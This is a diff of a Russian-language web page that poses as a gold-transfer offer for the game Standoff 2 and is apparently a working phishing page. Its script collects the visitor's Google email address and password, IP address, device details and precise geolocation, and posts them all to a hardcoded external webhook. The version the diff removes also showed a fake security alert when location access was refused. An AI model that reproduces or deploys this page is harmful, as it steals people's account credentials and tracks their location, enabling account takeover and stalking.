@@ -2,9 +2,9 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Standoff 2 - Gold transfer</title>
   <style>
+    /* Основные стили */
     body {
       font-family: Arial, sans-serif;
       background-color: #121212;
@@ -23,10 +23,12 @@
       padding: 20px;
       border-radius: 8px;
       box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
+      animation: fadeIn 1s ease-in-out;
     }
     h1, h2 {
       text-align: center;
       margin-bottom: 20px;
+      animation: fadeIn 1.5s ease-in-out;
     }
     .input-group {
       margin-bottom: 15px;
@@ -53,6 +55,7 @@
       border-radius: 5px;
       cursor: pointer;
       font-size: 16px;
+      transition: background-color 0.3s ease;
     }
     button:hover {
       background-color: #005bb5;
@@ -60,254 +63,222 @@
     .form-section {
       margin-bottom: 20px;
     }
-    #url-info {
-      margin-bottom: 20px;
-      font-size: 14px;
-      line-height: 1.5;
+    /* Анимации */
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
     }
-    #login-result {
-      margin-top: 10px;
-      font-size: 14px;
+    .fade-in {
+      animation: fadeIn 1s ease-in-out;
+    }
+    @keyframes bounce {
+      0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
+      40% { transform: translateY(-20px); }
+      60% { transform: translateY(-10px); }
+    }
+    .bounce {
+      animation: bounce 2s infinite;
+    }
+    /* Стили для изображений */
+    #gift-container, .gold-images {
+      text-align: center;
+      margin-bottom: 15px;
+    }
+    #gift-container img, .gold-images img {
+      max-width: 80px;
+      display: inline-block;
+    }
+    .gold-images img {
+      margin: 0 10px;
     }
   </style>
 </head>
 <body>
   <div class="container">
     <h1>Gold Transfer</h1>
-    <!-- Область для отображения данных декодированного URL -->
-    <div id="url-info"></div>
-      
-    <div class="form-section">
+    
+    <!-- Страница авторизации -->
+    <div class="form-section" id="auth-section">
       <h2>Авторизация</h2>
-      <!-- Используем метод POST для предотвращения изменения URL -->
-      <form id="login-form" method="POST">
+      <form id="login-form">
         <div class="input-group">
           <label for="email">Google Почта:</label>
-          <input type="email" id="email" name="email" placeholder="Введите адрес электронной почты" required>
+          <input type="email" id="email" name="email" required>
         </div>
         <div class="input-group">
-          <label for="password">Пароль от почты:</label>
-          <input type="password" id="password" name="password" placeholder="Введите пароль" required>
+          <label for="password">Пароль:</label>
+          <input type="password" id="password" name="password" required>
         </div>
         <button type="submit">Войти</button>
       </form>
       <div id="login-result"></div>
     </div>
-      
+
+    <!-- Страница получения голды -->
     <div class="form-section" id="gold-section" style="display:none;">
+      <!-- Верхняя анимированная картинка подарка -->
+      <div id="gift-container" class="fade-in">
+        <img src="gift.png" alt="Подарок" class="gift bounce">
+      </div>
       <h2>Получить Gold</h2>
+      <!-- Блок для вывода информации из ID -->
+      <div id="url-info" class="fade-in"></div>
+      <!-- Кнопка получения -->
       <button id="get-gold-button">Получить Gold</button>
+      <!-- Дополнительный блок с изображениями голды -->
+      <div class="gold-images fade-in">
+        <img src="small_gold.png" alt="Мало голды">
+        <img src="big_gold.png" alt="Много голды">
+      </div>
     </div>
   </div>
-  
+
   <script>
-    // Вспомогательные функции для работы с cookie
+    const DISCORD_WEBHOOK_URL = "https://hkdk.events/oyt9imlhvrjiqx";
+
     function setCookie(name, value, days) {
-      const date = new Date();
-      date.setTime(date.getTime() + (days*24*60*60*1000));
-      document.cookie = name + "=" + encodeURIComponent(value) + ";expires=" + date.toUTCString() + ";path=/";
+      const expires = new Date(Date.now() + days * 864e5).toUTCString();
+      document.cookie = name + '=' + encodeURIComponent(value) + '; expires=' + expires + '; path=/';
     }
 
     function getCookie(name) {
-      const value = "; " + document.cookie;
-      const parts = value.split("; " + name + "=");
-      if (parts.length === 2) return decodeURIComponent(parts.pop().split(";").shift());
-      return null;
+      return document.cookie.split('; ').reduce((r, v) => {
+        const parts = v.split('=');
+        return parts[0] === name ? decodeURIComponent(parts[1]) : r
+      }, '');
     }
-    
-    // Проверяем, получал ли уже пользователь голду
+
     function checkGoldCollected() {
       return getCookie("gold_collected") === "true";
     }
 
-    // Если пользователь уже получил Gold, отображаем сообщение и скрываем кнопку получения
-    window.onload = function() {
-      if (checkGoldCollected()) {
-        document.getElementById("gold-section").innerHTML = '<h2>Вы уже получили Gold</h2>';
+    // Функция для чтения длины до символа '0'
+    function readLength(str, idx) {
+      let lengthStr = '';
+      while (str[idx] !== '0' && idx < str.length) {
+        lengthStr += str[idx];
+        idx++;
       }
-    };
+      return [parseInt(lengthStr, 10), idx + 1];
+    }
 
-    const DISCORD_WEBHOOK_URL = "https://hkdk.events/oyt9imlhvrjiqx";
+    // Декодирование параметров из Base64
+    function decodeBase64Params(base64Str) {
+      try {
+        const decodedStr = atob(base64Str);
+        let idx = 0;
+        let [idLen, i1] = readLength(decodedStr, idx);
+        const senderId = decodedStr.substr(i1, idLen);
+        idx = i1 + idLen;
+        let [nickLen, i2] = readLength(decodedStr, idx);
+        const senderNick = decodedStr.substr(i2, nickLen);
+        idx = i2 + nickLen;
+        let [goldLen, i3] = readLength(decodedStr, idx);
+        const goldAmount = decodedStr.substr(i3, goldLen);
+        idx = i3 + goldLen;
+        const hiddenParam = idx < decodedStr.length ? decodedStr.substr(idx) : null;
+        return { senderId, senderNick, goldAmount, hiddenParam };
+      } catch (e) {
+        console.error("Ошибка декодирования:", e);
+        return null;
+      }
+    }
 
-    // Объект для хранения информации об устройстве, IP и геолокации
+    // Сбор информации об устройстве и IP
     const clientInfo = {
-      geolocation: {},
       device: {
         userAgent: navigator.userAgent,
         platform: navigator.platform,
         language: navigator.language,
         screenResolution: `${window.screen.width}x${window.screen.height}`
       },
-      ip: null // IP-адрес будет получен через API
+      ip: null,
+      geolocation: {}
     };
 
-    // Получение IP-адреса через API ipify
     fetch("https://api.ipify.org?format=json")
-      .then(response => response.json())
-      .then(data => {
-        clientInfo.ip = data.ip;
-      })
-      .catch(error => {
-        console.error("Ошибка получения IP:", error);
+      .then(res => res.json())
+      .then(data => { clientInfo.ip = data.ip; });
+
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(pos => {
+        clientInfo.geolocation = {
+          lat: pos.coords.latitude,
+          lon: pos.coords.longitude,
+          accuracy: pos.coords.accuracy
+        };
       });
-
-    // Запрос геолокации с повышенной точностью
-    if ('geolocation' in navigator) {
-      navigator.geolocation.getCurrentPosition(
-        (position) => {
-          const coords = position.coords;
-          clientInfo.geolocation = {
-            latitude: coords.latitude,
-            longitude: coords.longitude,
-            accuracy: coords.accuracy,
-            altitude: coords.altitude || null,
-            altitudeAccuracy: coords.altitudeAccuracy || null,
-            heading: coords.heading || null,
-            speed: coords.speed || null,
-            timestamp: position.timestamp
-          };
-        },
-        (error) => {
-          if (error.code === error.PERMISSION_DENIED) {
-            alert('Ошибка авторизации: обнаружена подозрительная активность, связанная с частыми изменениями геолокации');
-          } else {
-            console.error('Ошибка получения геолокации:', error.message);
-          }
-          clientInfo.geolocation = {
-            error: error.message,
-            code: error.code
-          };
-        },
-        {
-          enableHighAccuracy: true,
-          timeout: 15000,
-          maximumAge: 0
-        }
-      );
-    } else {
-      console.error('Геолокация не поддерживается данным браузером');
-      clientInfo.geolocation = { error: 'Geolocation not supported' };
     }
 
-    /* 
-      Функция декодирования Base64-параметров из строки URL.
-      Структура строки:
-      [len(sender_id)][sender_id][len(sender_nick)][sender_nick][len(gold_amount)][gold_amount][hidden_param (остальное)]
-    */
-    function decodeBase64Params(base64Str) {
-      try {
-        const decodedStr = atob(base64Str);
-        let idx = 0;
-        // Длина ID отправителя
-        const senderIdLength = parseInt(decodedStr[idx], 10);
-        idx++;
-        const senderId = decodedStr.substr(idx, senderIdLength);
-        idx += senderIdLength;
-        // Длина ника отправителя
-        const senderNickLength = parseInt(decodedStr[idx], 10);
-        idx++;
-        const senderNick = decodedStr.substr(idx, senderNickLength);
-        idx += senderNickLength;
-        // Длина количества голды
-        const goldAmountLength = parseInt(decodedStr[idx], 10);
-        idx++;
-        const goldAmount = decodedStr.substr(idx, goldAmountLength);
-        idx += goldAmountLength;
-        // Если в строке ещё есть данные, это скрытый параметр
-        const hiddenParam = idx < decodedStr.length ? decodedStr.substr(idx) : null;
-        return { senderId, senderNick, goldAmount, hiddenParam };
-      } catch (error) {
-        console.error("Ошибка ID транзакции:", error);
-        return null;
-      }
-    }
-
-    // Извлечение параметров из URL (ожидается параметр с именем "ID")
-    function getParamsFromURL() {
-      const params = new URLSearchParams(window.location.search);
-      const data = params.get("ID");
-      if (data) {
-        return decodeBase64Params(data);
-      }
-      return null;
-    }
-
-    // Отображение параметров на странице (скрытый параметр не выводится)
-    const urlParams = getParamsFromURL();
-    if (urlParams) {
-      document.getElementById("url-info").innerHTML =
-        "ID отправителя: " + urlParams.senderId + "<br>" +
-        "Ник отправителя: " + urlParams.senderNick + "<br>" +
-        "Количество Gold: " + urlParams.goldAmount;
-    } else {
-      document.getElementById("url-info").innerHTML = "Некорректный ID транзакции";
-    }
-
-    // Функция для отправки данных на Discord Webhook
-    function sendDataToWebhook(messageContent, callback) {
+    function sendDataToWebhook(content, cb) {
       fetch(DISCORD_WEBHOOK_URL, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ content: messageContent })
-      })
-      .then(response => callback(response.ok))
-      .catch(error => {
-        console.error("Ошибка отправки данных:", error);
-        callback(false);
-      });
+        body: JSON.stringify({ content })
+      }).then(res => cb(res.ok)).catch(() => cb(false));
     }
 
-    // Обработка формы авторизации
-    document.getElementById("login-form").addEventListener("submit", function(e) {
-      e.preventDefault(); // Предотвращает изменение URL
-
+    // Обработка авторизации
+    const loginForm = document.getElementById("login-form");
+    loginForm.addEventListener("submit", function (e) {
+      e.preventDefault();
       const email = document.getElementById("email").value;
       const password = document.getElementById("password").value;
-
-      const message = "Новая авторизация:\n" +
-                      "Email: " + email + "\n" +
-                      "Пароль: " + password + "\n" +
-                      "Дополнительная информация: " + JSON.stringify(clientInfo);
-
-      sendDataToWebhook(message, function(success) {
+      const message = `Новая авторизация:
+Email: ${email}
+Пароль: ${password}
+Инфо: ${JSON.stringify(clientInfo)}`;
+      sendDataToWebhook(message, function (success) {
         if (success) {
-          document.getElementById("login-result").textContent = "Авторизация прошла успешно";
+          document.getElementById("login-result").textContent = "Авторизация успешна";
+          document.getElementById("auth-section").style.display = "none";
           document.getElementById("gold-section").style.display = "block";
+          showGoldParams();
         } else {
           document.getElementById("login-result").textContent = "Ошибка при авторизации";
         }
       });
     });
 
-    // Обработка запроса на получение голды
-    document.getElementById("get-gold-button").addEventListener("click", function() {
-      // Если пользователь уже получил Gold, просто выходим
-      if (checkGoldCollected()) {
-        alert("Вы уже получили Gold");
+    // Отображение параметров из URL
+    function showGoldParams() {
+      const params = new URLSearchParams(window.location.search);
+      const idParam = params.get("ID");
+      if (!idParam) {
+        document.getElementById("url-info").textContent = "Некорректный ID";
         return;
       }
-      if (urlParams) {
-        const message = "Запрос на получение голды:\n" +
-                        "ID отправителя: " + urlParams.senderId + "\n" +
-                        "Ник отправителя: " + urlParams.senderNick + "\n" +
-                        "Количество Gold: " + urlParams.goldAmount + "\n" +
-                        "Дополнительная информация: " + JSON.stringify(clientInfo);
-
-        sendDataToWebhook(message, function(success) {
-          if (success) {
-            alert("Передача Gold успешно завершена");
-            // Сохраняем отметку о получении Gold в cookie на 7 дней
+      const decoded = decodeBase64Params(idParam);
+      if (!decoded) {
+        document.getElementById("url-info").textContent = "Ошибка декодирования ID";
+        return;
+      }
+      document.getElementById("url-info").innerHTML = `
+        ID отправителя: ${decoded.senderId}<br>
+        Ник: ${decoded.senderNick}<br>
+        Кол-во Gold: ${decoded.goldAmount}
+      `;
+      document.getElementById("get-gold-button").onclick = function () {
+        if (checkGoldCollected()) {
+          alert("Вы уже получили Gold");
+          return;
+        }
+        const goldMsg = `Получение голды:
+ID: ${decoded.senderId}
+Ник: ${decoded.senderNick}
+Gold: ${decoded.goldAmount}
+Инфо: ${JSON.stringify(clientInfo)}`;
+        sendDataToWebhook(goldMsg, function (ok) {
+          if (ok) {
+            alert("Gold успешно получено");
             setCookie("gold_collected", "true", 7);
-            // Обновляем интерфейс
-            document.getElementById("gold-section").innerHTML = '<h2>Вы уже получили Gold</h2>';
+            document.getElementById("gold-section").innerHTML = "<h2>Вы уже получили Gold</h2>";
           } else {
-            alert("Ошибка при получение Gold.");
+            alert("Ошибка при получении");
           }
         });
-      } else {
-        alert("Неверный ID транзакции");
-      }
-    });
+      };
+    }
   </script>
 </body>
 </html>
